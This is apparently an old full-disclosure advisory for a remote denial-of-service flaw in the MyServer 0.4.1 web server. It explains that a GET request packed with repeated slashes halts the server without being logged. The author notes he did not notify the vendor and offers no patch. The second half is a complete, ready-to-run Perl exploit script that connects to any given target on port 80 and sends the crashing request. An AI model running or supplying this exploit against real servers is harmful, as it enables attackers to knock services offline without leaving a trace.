Product: 	Myserver 0.4.1 (http://myserverweb.sourceforge.net)

Note:  		yep, I'm on the dole, anyone wanna give me a job :)

Vendor Notification:	Woooops, sorry i forgot ;)


Background:

(from homepage)
MyServer is a free and easy to configure web server. MyServer is licensed under the GNU General Public License (GPL). See the license page for additional info.
Myserver runs under both Windows and Linux..
Although there is allready several found flaws in Myserver, I thought that the closet bug to this was:
http://www.securityfocus.org/bid/7770/info/

but that was using excessive amounts of data.. We only need to use 20 "//" to cause a Dos condition..


Problem Description:

When Myserver is running a simple GET request can cause a Remote Denial of service, stopping the HTTP server
alltogether.. 
Also an extra note, this DOS doesn't get entered into the log file ;) 

Impact:

Denial of service..possible code execution, haven't tested it fully yet..still finding holes  ;)

Patch:

Nope i don't do patches.... ;)

Exploit:
----------------myserver.pl------------------------
#!/usr/bin/perl
 
#Myserver 0.4.1 Remote Denial of service ;)
#oh joy...
#deadbeat, uk2sec
#eip@oakey.no-ip.com

use IO::Socket;
$dos = "//"x100;
$request = "GET $dos"."HTTP/1.0\r\n\r\n";
 
$target = $ARGV[0];
 
print "\n\nMyserver 0.4.1 Remote Denial Of Service..\n";
print "deadbeat, uk2sec..\n";
print "usage: perl $0 <target>\n";
$sox = IO::Socket::INET->new(
        Proto=>"tcp",
        PeerPort=>"80",
        PeerAddr=>"$target"
)or die "\nCan't connect to $target..\n";
print $sox $request;
sleep 2;
close $sox;
print "Done...\n";
